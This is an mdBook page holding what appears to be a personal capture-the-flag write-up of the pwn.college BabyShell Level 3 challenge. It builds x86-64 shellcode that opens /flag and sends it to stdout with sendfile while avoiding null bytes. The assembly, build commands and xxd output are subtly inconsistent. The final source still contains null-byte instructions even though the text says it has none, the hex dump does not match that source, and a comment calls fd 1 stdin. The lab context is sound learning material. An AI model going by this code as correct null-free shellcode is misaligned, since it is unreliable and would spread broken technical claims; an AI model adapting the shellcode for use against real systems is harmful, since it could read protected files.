<!DOCTYPE HTML>
<html lang="en" class="sidebar-visible no-js light">
    <head>
        <!-- Book generated using mdBook -->
        <meta charset="UTF-8">
        <title>BabyShell Level 3 - Exploitation Freaks</title>
        <!-- Custom HTML head -->
        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
        <meta name="description" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="theme-color" content="#ffffff" />

        <link rel="icon" href="favicon.svg">
        <link rel="shortcut icon" href="favicon.png">
        <link rel="stylesheet" href="css/variables.css">
        <link rel="stylesheet" href="css/general.css">
        <link rel="stylesheet" href="css/chrome.css">
        <link rel="stylesheet" href="css/print.css" media="print">
        <!-- Fonts -->
        <link rel="stylesheet" href="FontAwesome/css/font-awesome.css">
        <link rel="stylesheet" href="fonts/fonts.css">
        <!-- Highlight.js Stylesheets -->
        <link rel="stylesheet" href="highlight.css">
        <link rel="stylesheet" href="tomorrow-night.css">
        <link rel="stylesheet" href="ayu-highlight.css">

        <!-- Custom theme stylesheets -->
    </head>
    <body>
        <!-- Provide site root to javascript -->
        <script type="text/javascript">
            var path_to_root = "";
            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "light";
        </script>

        <!-- Work around some values being stored in localStorage wrapped in quotes -->
        <script type="text/javascript">
            try {
                var theme = localStorage.getItem('mdbook-theme');
                var sidebar = localStorage.getItem('mdbook-sidebar');

                if (theme.startsWith('"') && theme.endsWith('"')) {
                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
                }

                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
                }
            } catch (e) { }
        </script>

        <!-- Set the theme before any content is loaded, prevents flash -->
        <script type="text/javascript">
            var theme;
            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
            if (theme === null || theme === undefined) { theme = default_theme; }
            var html = document.querySelector('html');
            html.classList.remove('no-js')
            html.classList.remove('light')
            html.classList.add(theme);
            html.classList.add('js');
        </script>

        <!-- Hide / unhide sidebar before it is displayed -->
        <script type="text/javascript">
            var html = document.querySelector('html');
            var sidebar = 'hidden';
            if (document.body.clientWidth >= 1080) {
                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
                sidebar = sidebar || 'visible';
            }
            html.classList.remove('sidebar-visible');
            html.classList.add("sidebar-" + sidebar);
        </script>

        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
            <div class="sidebar-scrollbox">
                <ol class="chapter"><li class="chapter-item expanded "><a href="introduction.html"><strong aria-hidden="true">1.</strong> Introduction</a></li><li class="chapter-item expanded "><div><strong aria-hidden="true">2.</strong> Exploitation</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="pwntools-debugging.html"><strong aria-hidden="true">2.1.</strong> Pwntools Debugging</a></li><li class="chapter-item expanded "><a href="cve-2015-3887.html"><strong aria-hidden="true">2.2.</strong> CVE-2015-3887</a></li><li class="chapter-item expanded "><div><strong aria-hidden="true">2.3.</strong> TetCTF 2022</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="newbie_tetctf.html"><strong aria-hidden="true">2.3.1.</strong> Newbie</a></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">2.4.</strong> Cyber Santa is Coming to Town</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="hackthebox-pwn-snowy.html"><strong aria-hidden="true">2.4.1.</strong> Mr Snowy</a></li><li class="chapter-item expanded "><a href="hackthebox-pwn-sleigh.html"><strong aria-hidden="true">2.4.2.</strong> Sleigh</a></li><li class="chapter-item expanded "><a href="hackthebox-pwn-naughty-list.html"><strong aria-hidden="true">2.4.3.</strong> Naughty List</a></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">2.5.</strong> ROPEmporium</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="ropemporium-split.html"><strong aria-hidden="true">2.5.1.</strong> Split</a></li></ol></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">3.</strong> Reverse Engineering</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="anatomy-of-a-gopher.html"><strong aria-hidden="true">3.1.</strong> Anatomy of a Gopher</a></li><li class="chapter-item expanded "><a href="gomalware-reversing-in-action.html"><strong aria-hidden="true">3.2.</strong> Go Malware Reverse Engineering with Kaspersky</a></li><li class="chapter-item expanded "><div><strong aria-hidden="true">3.3.</strong> Arizona State University Notes</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="pwn-college-embryoasm_level6.html"><strong aria-hidden="true">3.3.1.</strong> EmbryoASM Level 6</a></li><li class="chapter-item expanded "><a href="pwn-college-babyshell_level1.html"><strong aria-hidden="true">3.3.2.</strong> BabyShell Level 1</a></li><li class="chapter-item expanded "><a href="pwn-college-babyshell-level3.html" class="active"><strong aria-hidden="true">3.3.3.</strong> BabyShell Level 3</a></li><li class="chapter-item expanded "><a href="pwn-college-babyshell-level4.html"><strong aria-hidden="true">3.3.4.</strong> BabyShell Level 4</a></li><li class="chapter-item expanded "><a href="pwn-college-babyshell-level5.html"><strong aria-hidden="true">3.3.5.</strong> BabyShell Level 5</a></li><li class="chapter-item expanded "><a href="pwn-college-babyshell-level6.html"><strong aria-hidden="true">3.3.6.</strong> BabyShell Level 6</a></li><li class="chapter-item expanded "><a href="pwn-college-babyshell-level7.html"><strong aria-hidden="true">3.3.7.</strong> BabyShell Level 7</a></li><li class="chapter-item expanded "><a href="pwn-college-babyshell-level8.html"><strong aria-hidden="true">3.3.8.</strong> Babyshell Level 8</a></li><li class="chapter-item expanded "><a href="pwn-college-baby_reversing-5.html"><strong aria-hidden="true">3.3.9.</strong> BabyReverse Level 5</a></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">3.4.</strong> Flare 8 (2021)</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="credchecker.html"><strong aria-hidden="true">3.4.1.</strong> credchecker</a></li></ol></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">4.</strong> Programming</div></li><li><ol class="section"><li class="chapter-item expanded "><div><strong aria-hidden="true">4.1.</strong> The Linux Programming Interface</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="programming-tee.html"><strong aria-hidden="true">4.1.1.</strong> Exercise 4.1 (reproducing the tee linux binary)</a></li></ol></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">5.</strong> Other</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="half-handshake-crack.html"><strong aria-hidden="true">5.1.</strong> Half-Handshake Crack</a></li><li class="chapter-item expanded "><a href="tn-wn722n-monitor-mode.html"><strong aria-hidden="true">5.2.</strong> TN-WN722N Monitor Mode</a></li><li class="chapter-item expanded "><a href="awus036ach-monitor-mode.html"><strong aria-hidden="true">5.3.</strong> AWUS036ACH Monitor Mode</a></li><li class="chapter-item expanded "><a href="rpi-rtl88x2bu-evil-AP.html"><strong aria-hidden="true">5.4.</strong> RTL88x2bu Fake Access Point</a></li><li class="chapter-item expanded "><a href="windows-cheatsheet.html"><strong aria-hidden="true">5.5.</strong> Windows Cheatsheet</a></li></ol></li></ol>
            </div>
            <div id="sidebar-resize-handle" class="sidebar-resize-handle"></div>
        </nav>

        <div id="page-wrapper" class="page-wrapper">

            <div class="page">
                <div id="menu-bar-hover-placeholder"></div>
                <div id="menu-bar" class="menu-bar sticky bordered">
                    <div class="left-buttons">
                        <button id="sidebar-toggle" class="icon-button" type="button" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
                            <i class="fa fa-bars"></i>
                        </button>
                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
                            <i class="fa fa-paint-brush"></i>
                        </button>
                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
                            <li role="none"><button role="menuitem" class="theme" id="light">Light (default)</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
                        </ul>
                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
                            <i class="fa fa-search"></i>
                        </button>
                    </div>

                    <h1 class="menu-title">Exploitation Freaks</h1>

                    <div class="right-buttons">
                        <a href="print.html" title="Print this book" aria-label="Print this book">
                            <i id="print-button" class="fa fa-print"></i>
                        </a>
                    </div>
                </div>

                <div id="search-wrapper" class="hidden">
                    <form id="searchbar-outer" class="searchbar-outer">
                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
                    </form>
                    <div id="searchresults-outer" class="searchresults-outer hidden">
                        <div id="searchresults-header" class="searchresults-header"></div>
                        <ul id="searchresults">
                        </ul>
                    </div>
                </div>
                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
                <script type="text/javascript">
                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
                    });
                </script>

                <div id="content" class="content">
                    <main>
                        <h1 id="babyshell-level-3"><a class="header" href="#babyshell-level-3">Babyshell Level 3</a></h1>
<p>Babyshell level 3 is the third challenge from pwn.college shellcoding module, it is pretty simple if you have watched the <a href="https://www.youtube.com/watch?v=715v_-YnpT8&amp;t=1968s">videos for the module</a>.</p>
<h2 id="solving-the-challenge"><a class="header" href="#solving-the-challenge">Solving The Challenge</a></h2>
<p>Solving the challenge is pretty straight forward, we need to remove all null bytes from our shellcode, if there is any null bytes in our shellcode the program will fail.</p>
<p>The challenge took me a couple hours to solve since i had to find instructions that doesn't contains any null bytes in their opcode, i found the following informations :
- a lot of time <strong>mov</strong> instructions have null bytes in their opcode, however with <strong>rbx</strong> that was not the case, so i used <strong>rbx</strong> a little in the final solution <strong>instead of directly moving the value &quot;/flag&quot; into rdi</strong>.
- if your string ends with a <strong>null character</strong>, you can <strong>replace it for a carriage return.</strong>
- <strong>push and pop</strong> can be easily used as a replacement for the <strong>mov</strong> instruction, just push the value on the stack and pop it back into any register you want, we will use this technique <strong>a LOT</strong>, this way we will spend less time trying to fix mov instructions with null bytes.</p>
<p>With the preceding informations we should have a really got view of how we will solve this challenge.</p>
<p>Let's start writing our shellcode, first we need a opened file descriptor to our flag file :</p>
<pre><code class="language-x86asm">.global _start
_start:
.intel_syntax noprefix
	# Open file descriptor
	xor rsi, rsi 			# zero out rsi
	mov ebx, 0x67616c66		# mov value &quot;galf&quot; in ebx
	shl rbx, 8				# shift rbx one byte to the left this way we have place for a &quot;/&quot; in bl register
	mov bl, 0x2f			# mov 0x2f &quot;/&quot; inside bl
	push rbx				# push rbx onto the stack so it can be moved inside rdi
	mov rdi, rsp			# mov the value &quot;/flag&quot; which is now on top of the stack in rdi
	mov rax, 2				# sys_open syscall number
	syscall					# call into the kernel
</code></pre>
<p>When this code executes it should return a file descriptor to the &quot;/flag&quot; file. </p>
<p>We moved the value &quot;/flag&quot; using ebx and a shift left because &quot;/flag&quot; is 5 bits long and moving a 5 bytes value inside rbx (8 bytes register), it would have certainly implied some null bytes in the opcode.</p>
<p>The value &quot;<strong>flag</strong>&quot;, is 4 bytes wide which <strong>fits inside ebx</strong>, so we can just <strong>move &quot;flag&quot; in ebx</strong>, <strong>shift it to the left 8 bits</strong> so we have space to put &quot;/&quot; in the <strong>lower 8 bits of ebx</strong>, and mov <strong>0x2f</strong> in it which is &quot;/&quot; in ascii encoding.</p>
<p>The next step was to actually put rbx inside rdi since rbx is not on the x64 kernel calling convention, so just push the value inside rbx onto the stack and pop it back inside rdi, and you should have done the hardest part in this shellcode.</p>
<p>The next steps are exactly as in the last challenge (babyshell 2), but in this one we'll use <strong>push and pop</strong> instructions instead of using the <strong>mov</strong> instruction for the arguments.</p>
<p>Just like in the last challenge we will use the <strong>sendfile systemcall</strong> to read the file and send it to a file descriptor, in our case (<strong>stdout</strong>).</p>
<p>The function definition for sendfile is the following :</p>
<pre><code class="language-c">ssize_t sendfile(int out_fd, int in_fd, off_t *offset, size_t count);
</code></pre>
<p>The function takes three arguments, the output file descriptor, the input file descriptor, the offset (in our case 0), and the count of bytes we wish to read.</p>
<p>On x86_64 linux the kernel interface uses the following register as calling convention  : <strong>%rdi, %rsi, %rdx, %r10, %r8 and %r9.</strong> Since <strong>sendfile</strong> had 4 arguments, we will need <strong>%rdi, %rsi, %rdx, %r10</strong>.</p>
<p>Let's write the second part of our shellcode :</p>
<pre><code class="language-x86asm">.global _start
_start:
.intel_syntax noprefix
	# Open file descriptor
	xor rsi, rsi 			# zero out rsi
	mov ebx, 0x67616c66		# mov value &quot;galf&quot; in ebx
	shl rbx, 8				# shift rbx one byte to the left this way we have place for a &quot;/&quot; in bl register
	mov bl, 0x2f			# mov 0x2f &quot;/&quot; inside bl
	push rbx				# push rbx onto the stack so it can be moved inside rdi
	mov rdi, rsp			# mov the value &quot;/flag&quot; which is now on top of the stack in rdi
	mov rax, 2				# sys_open syscall number
	syscall					# call into the kernel

	# Read and output the file
	push 1					# push stdin file descriptor number on the stack (out_fd)
	pop rdi					# pop the value in rdi
	push rax				# push the return value from our last systemcall (filedescriptor) inside (in_fd)
	pop rsi 				# pop it inside rsi
	push 0					# push 0 on the stack (offset)
	pop rdx					# pop it inside rdx
	push 1024				# push the number of bytes we wish to read (count)
	pop r10					# pop the number of bytes we wish to read inside r10
	push 40					# push syscall number on the stack
	pop rax					# pop it back inside rax
	syscall 				# call into the kernel
</code></pre>
<p>With the preceding code, if you compile it, it should work and read the file, however we want a clean exit, to avoid any bug with our program when leaving or returning, for this reason we will write a last system call which will cause to exit the program cleanly :</p>
<pre><code class="language-x86asm">.global _start
_start:
.intel_syntax noprefix
	# Open file descriptor
	xor rsi, rsi 			# zero out rsi
	mov ebx, 0x67616c66		# mov value &quot;galf&quot; in ebx
	shl rbx, 8				# shift rbx one byte to the left this way we have place for a &quot;/&quot; in bl register
	mov bl, 0x2f			# mov 0x2f &quot;/&quot; inside bl
	push rbx				# push rbx onto the stack so it can be moved inside rdi
	mov rdi, rsp			# mov the value &quot;/flag&quot; which is now on top of the stack in rdi
	mov rax, 2				# sys_open syscall number
	syscall					# call into the kernel

	# Read and output the file
	push 1					# push stdin file descriptor number on the stack (out_fd)
	pop rdi					# pop the value in rdi
	push rax				# push the return value from our last systemcall (filedescriptor) inside (in_fd)
	pop rsi 				# pop it inside rsi
	push 0					# push 0 on the stack (offset)
	pop rdx					# pop it inside rdx
	push 1024				# push the number of bytes we wish to read (count)
	pop r10					# pop the number of bytes we wish to read inside r10
	push 40					# push syscall number on the stack
	pop rax					# pop it back inside rax
	syscall 				# call into the kernel

	# Exit the program cleanly
	push 60 				# system call number
	pop rax					# pop system call number in rax
	push 69					# exit number
	pop rdi					# pop exit number in rdi
	syscall
</code></pre>
<p>And we should have a shellcode that contains no null bytes, just like the program asks us, let's make sure we did everything right :</p>
<pre><code>$ gcc -w -nostdlib -static -o shell shellcode.s -masm=intel
$ ./shell
flag{fake_flag_for_testing}
$ objcopy --dump-section .text=solver shell
$ xxd solver
</code></pre>
<p>After running xxd on the resulting file you should see all the bytes in hexadecimal the shellcode actually has, if it contains any &quot;00&quot; we have failed the shellcode, if it don't we successfully achieved what we wanted to :</p>
<pre><code>$ xxd solver
00000000: 4831 f6bb 666c 6167 48c1 e308 b32f 5348  H1..flagH..../SH
00000010: 89e7 6a02 580f 056a 015f 505e 4831 d26a  ..j.X..j._P^H1.j
00000020: 6441 5a6a 2858 0f05 6a3c 586a 2a5f 0f05  dAZj(X..j&lt;Xj*_..
</code></pre>
<p>And it looks to me like we were able to evade this no null-bytes filter on the shellcode !</p>
<p>Let's prove it :</p>
<pre><code>$ ./babyshell_level3 &lt;solver
flag{fake_flag_for_testing}
</code></pre>
<p>:)</p>

                    </main>

                    <nav class="nav-wrapper" aria-label="Page navigation">
                        <!-- Mobile navigation buttons -->
                            <a rel="prev" href="pwn-college-babyshell_level1.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                                <i class="fa fa-angle-left"></i>
                            </a>
                            <a rel="next" href="pwn-college-babyshell-level4.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                                <i class="fa fa-angle-right"></i>
                            </a>
                        <div style="clear: both"></div>
                    </nav>
                </div>
            </div>

            <nav class="nav-wide-wrapper" aria-label="Page navigation">
                    <a rel="prev" href="pwn-college-babyshell_level1.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                        <i class="fa fa-angle-left"></i>
                    </a>
                    <a rel="next" href="pwn-college-babyshell-level4.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                        <i class="fa fa-angle-right"></i>
                    </a>
            </nav>

        </div>

        <script type="text/javascript">
            window.playground_copyable = true;
        </script>
        <script src="elasticlunr.min.js" type="text/javascript" charset="utf-8"></script>
        <script src="mark.min.js" type="text/javascript" charset="utf-8"></script>
        <script src="searcher.js" type="text/javascript" charset="utf-8"></script>
        <script src="clipboard.min.js" type="text/javascript" charset="utf-8"></script>
        <script src="highlight.js" type="text/javascript" charset="utf-8"></script>
        <script src="book.js" type="text/javascript" charset="utf-8"></script>

        <!-- Custom JS scripts -->
    </body>
</html>
